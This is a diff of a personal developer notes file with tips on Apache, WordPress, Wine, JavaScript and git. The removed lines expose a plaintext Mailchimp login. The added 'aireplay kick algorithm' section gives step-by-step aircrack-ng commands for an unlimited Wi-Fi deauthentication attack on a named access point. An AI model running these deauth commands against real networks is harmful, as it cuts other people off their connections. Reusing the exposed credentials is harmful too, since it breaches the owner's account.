@@ -28,7 +28,7 @@ A temporary workaround may be opening the ~/.config/openbox/lxde-rc.xml config f
 ## index.php removal not working solution
 
 ```txt
-open /etc/apache2/sites-available/000-default.conf and replace the <Directory > tag with the code below
+open /etc/apache2/sites-available/000-default.conf and replace the <Directory > tag with the code below. in some cases you add it
 
 <Directory "/var/www/html">
 
@@ -55,13 +55,57 @@ var allowPaste = function(e){
 document.addEventListener('paste',allowPaste,true);
 ```
 
-## syscomptech mailchimp credentials
-
-```txt
-username: syscomptech_mailer
-pass: Syscomptech`1234567890
-```
-
 ## My Gradr Assessment link
 
 [gradr](https://mygradr.web.app/RLSn4T6mJmQBORq7vnOt/!#intro)
+
+
+## for apache file permission issues run
+
+`sudo chmod -R 775 /var/www`
+
+## fix wordpress ftp issue
+
+* add `define( 'FS_METHOD', 'direct' );` to the wp-config file
+
+## fix wordpress or server not writing to files
+
+* run `chown www-data:www-data  -R wordpress` in terminal
+
+## fix wordpress cant crop image problem
+
+* run `sudo apt install php-gd` in terminal, and restart your apache server or system
+
+## wine 32bit prefix
+`WINEARCH=win32 WINEPREFIX=/home/tobecci/.wine winecfg`
+
+## download free images
+[pixabay](https://pixabay.com)
+
+## how to find overflowing elements on a page
+
+```js
+var docWidth = document.documentElement.offsetWidth;
+
+[].forEach.call(
+  document.querySelectorAll('*'),
+  function(el) {
+    if (el.offsetWidth > docWidth) {
+      console.log(el);
+    }
+  }
+);
+```
+## aireplay kick algorithm
+* `sudo airmon-ng start wlp12s0`
+* `sudo airodump-ng wlp12s0mon`
+* use `sudo iwconfig wlp12s0mon channel 1` to make sure `wlp12s0mon` is on channel `1`, that is the same channel as the AP 
+* `sudo aireplay-ng --deauth 0 -a E0:67:B3:1D:D5:0F wlp12s0mon`
+
+## hng6 links
+https://github.com/hngi/Team-NEMESIS/pull/22
+
+## how to undo a commit
+
+* `git reflog` to show the list of commits
+* `git reset --hard [hash]` where `[hash]` is the hash of the commit e.g 75fecb3
